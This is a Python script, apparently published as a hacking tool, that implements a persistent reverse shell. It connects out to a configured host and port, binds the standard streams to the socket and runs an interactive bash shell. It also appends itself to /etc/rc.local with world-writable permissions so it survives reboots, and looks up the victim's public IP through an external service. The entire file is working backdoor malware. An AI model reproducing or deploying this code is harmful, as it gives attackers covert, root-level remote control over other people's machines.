#!/usr/bin/env python3

import subprocess
import sys
import time
from subprocess import run
from os import dup2
import socket
import os
import requests


# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyjeek                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Github  :   @Keyj33k                  #
#   Version :   1.0.6                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # #

class Shell:

    def __init__(
            self,
            remote_username: str,
            remote_hostname: str,
            remote_ipv4_address: str,
            public_ipv4_address: str,
            remote_port: int,
            persis_path: str
    ):
        self.persis_path = persis_path
        self.remote_hostname = remote_hostname
        self.remote_username = remote_username
        self.public_ipv4_address = public_ipv4_address
        self.remote_ipv4_address = remote_ipv4_address
        self.remote_port = remote_port

    def shell(self):
        while True:
            try:
                with socket.socket(
                        socket.AF_INET,
                        socket.SOCK_STREAM
                ) as socket_sock:
                    socket_sock.connect((
                        self.remote_ipv4_address,
                        self.remote_port
                    ))

                    socket_sock.send(
                        f"\n\033[0;37m[\033[0;31m+\033[0;37m] Connected to {self.public_ipv4_address}!"
                            .encode()
                    )
                    
                    socket_sock.send(
                        f"\n\033[0;37m[\033[0;31m+\033[0;37m] Start interacting with target ..."
                            .encode()
                    )

                    time.sleep(1.75)

                    socket_sock.send(
                        f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected"
                            .encode() +
                        f" to {self.remote_username}'s machine {self.remote_hostname} "
                            .encode()
                    )
                    
                    socket_sock.send(
                        f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ..."
                            .encode()
                    )

                    time.sleep(1.75)

                    dup2(
                        socket_sock.fileno(),
                        0
                    )  # return stream integer file descriptor
                    
                    dup2(
                        socket_sock.fileno(),
                        1
                    )  # used for request I/O actions from the OS
                    
                    dup2(
                        socket_sock.fileno(),
                        2
                    )

                    socket_sock.send(
                        f"\n\033[0;37m[\033[0;31m+\033[0;37m] Successfully "
                            .encode() +
                        f"started a reverse shell to {self.remote_username}'s machine!\n\n"
                            .encode()
                    )

                    run([
                        "/bin/bash",
                        "-i"
                    ])
                    
            except ConnectionRefusedError:
                pass

    def create_persistence(self):
        if not os.path.isfile(self.persis_path):
            with open(
                self.persis_path, 
                "w"
            ) as persis_file:
                persis_file.write("#!/bin/bash\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will 'exit 0' on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing.\n")
            
            if os.path.isfile(self.persis_path):
                with open(
                    self.persis_path, 
                    "a"
                ) as persis_file1:
                    persis_file1.write(f"python3 {__file__} &")
                
                subprocess.call([
                    "chmod", 
                    "777", 
                    self.persis_path
                ])
        
        else:
            with open(
                self.persis_path, 
                "a"
            ) as persis_file1:
                persis_file1.write(f"python3 {__file__} &")
                
            subprocess.call([
                "chmod", 
                "777", 
                self.persis_path
            ])


if __name__ == "__main__":
    os.system('clear')

    if "SUDO_UID" not in os.environ.keys():
        print(":No Permissions, Error")
        sys.exit(1)

    reverse_connection = Shell(
        os.getlogin(),
        socket.gethostname(),
        "127.0.0.1",
        requests.get('https://api.ipify.org').text,
        5003,
        "/etc/rc.local"
    )

    reverse_connection.create_persistence()
    reverse_connection.shell()
